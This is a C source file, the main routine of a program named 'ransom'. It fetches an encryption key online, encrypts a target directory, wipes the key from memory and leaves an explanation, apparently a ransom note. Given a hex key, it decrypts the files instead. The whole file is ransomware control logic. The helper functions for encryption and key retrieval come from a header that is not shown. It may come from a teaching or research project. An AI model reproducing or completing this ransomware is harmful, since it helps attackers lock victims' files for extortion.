#include "src/libcom.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void usage() {
	printf("Usage : ./ransom <file> <key in hex if decrypt>\n");
}

// set depending on if the key is given or not (decrypt or encrypt)
int ENCRYPT = 1;

int main (int argc, char **argv){
	if (argc < 2) {
		usage();
		return 0;
	}
	int ID = 0;
	char* key = 0;
	// if the key is given then set decryption mode
	if(argc == 3){
		ENCRYPT = 0;
		key = malloc(LENGTH);
		char *hex_key = argv[2];
		hexa_to_bytes(hex_key, (unsigned char*)key, LENGTH);
	}
	// else keep encryption mode and get the key online
	else{
		key = getKey(ID);
	}
	encDir(argv[1], key);
	// avoid to see the key in the memory
	memset(key, 0, LENGTH);
	free(key);
	if(ENCRYPT == 1){
		leaveExplanation();
	} else {
		printf("Your files are now decrypted !\n");
	}
	return 0;
}
